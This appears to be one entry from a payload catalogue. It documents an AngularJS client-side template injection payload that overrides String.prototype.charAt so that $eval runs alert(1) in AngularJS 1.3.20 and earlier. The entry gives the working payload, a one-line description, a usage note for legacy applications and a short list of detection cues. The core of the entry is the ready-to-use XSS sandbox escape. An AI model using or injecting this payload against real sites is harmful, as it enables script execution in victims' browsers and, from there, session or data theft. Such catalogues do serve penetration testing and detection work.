---
type: code
language: JavaScript
verified: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
tags:
  - xss
  - prototype-pollution
  - angularjs
platforms:
  - Web
validated: true
---

# AngularJS-Basic-CharAt-Pollution-Alert

## Code

```javascript
{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
```

## Description

Basic prototype pollution of charAt to enable $eval execution of alert(1) in AngularJS <=1.3.20.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | Standard pollution payload. | N/A |

## Usage

For legacy AngularJS with weak prototype protections.

## Detection

- charAt redefinition alerts in security scanners.
- $eval with alert patterns.

## Related

- [[procedures/Angular-AngularJS-Stored-Reflected-XSS-Simple-Alert]]
